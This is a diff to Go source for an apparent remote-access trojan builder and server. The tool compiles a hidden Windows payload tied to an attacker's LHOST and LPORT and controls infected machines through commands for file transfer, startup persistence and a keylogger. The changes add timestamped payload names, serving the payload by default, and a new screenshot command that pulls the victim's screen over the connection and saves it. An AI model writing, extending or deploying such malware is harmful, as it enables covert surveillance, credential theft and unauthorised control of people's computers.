@@ -232,12 +232,13 @@ func GenerateCode() {
 	}
 
 	pathPersistence := GeneratePath(8)
+	NAME = NAME + getDateTime()
 
 	TemplateTextReplace(string(LHOST), string(LPORT), string(NAME + ".exe"), string(pathPersistence), string(NAME))
 
 	fmt.Println("")
 	fmt.Println(GREEN, "[*] Compiling...")
-	exec.Command("sh", "-c", "GOOS=windows GOARCH=386 go build -ldflags \"-s -w -H=windowsgui\" "+string(NAME)+".go").Output()
+	exec.Command("sh", "-c", "GOOS=windows GOARCH=386 go build -ldflags \"-s -w -H=windowsgui\" "+string(NAME) + ".go").Output()
 
 	fmt.Println(GREEN, "[*] Generated \"" + string(NAME) + ".exe\"")
 	fmt.Println("")
@@ -267,6 +268,7 @@ func GenerateCode() {
 	} else if SERVE == "n" || SERVE == "N" {
 		fmt.Println(WHITE, "[!] Not Serve!")
 	} else {
+		fmt.Println(GREEN, "[+] DEFAULT OPTION: STARTING SERVER NOW")
 		ServeFiles()
 	}
 
@@ -317,6 +319,7 @@ func RunServer() {
 			fmt.Println(CYAN, "-------------------------------------------------------")
 			fmt.Println(CYAN, "download            - File Download")
 			fmt.Println(CYAN, "upload              - File Upload")
+			fmt.Println(CYAN, "screenshot          - Take a ScreenShot")
 			fmt.Println(CYAN, "keylogger start     - Start Keylogger session")
 			fmt.Println(CYAN, "keylogger show      - Show Keylogger session logs")
 			fmt.Println(CYAN, "persistence enable  - Install at Startup")
@@ -348,6 +351,25 @@ func RunServer() {
 			encExit := base64.URLEncoding.EncodeToString([]byte("exit"))
 			conn.Write([]byte(encExit + "\n"))
 			os.Exit(0)
+
+		case "screenshot":
+			encScreenShot := base64.URLEncoding.EncodeToString([]byte("screenshot"))
+			conn.Write([]byte(encScreenShot + "\n"))
+
+			outputName := getDateTime()
+
+			encData, _ := bufio.NewReader(conn).ReadString('\n')
+
+			fmt.Println(YELLOW, "-> Getting ScreenShot...")
+			decData, _ := base64.URLEncoding.DecodeString(encData)
+
+			ioutil.WriteFile(string(outputName) + ".png", []byte(decData), 777)
+
+			out, err := exec.Command("sh", "-c", "eog " + string(outputName) + ".png").Output()
+			if err != nil {
+		     fmt.Printf("%s", err)
+		   }
+			fmt.Printf("%s", out)
 
 		case "keylogger start":
 			klgListen := base64.URLEncoding.EncodeToString([]byte("keylogger start"))
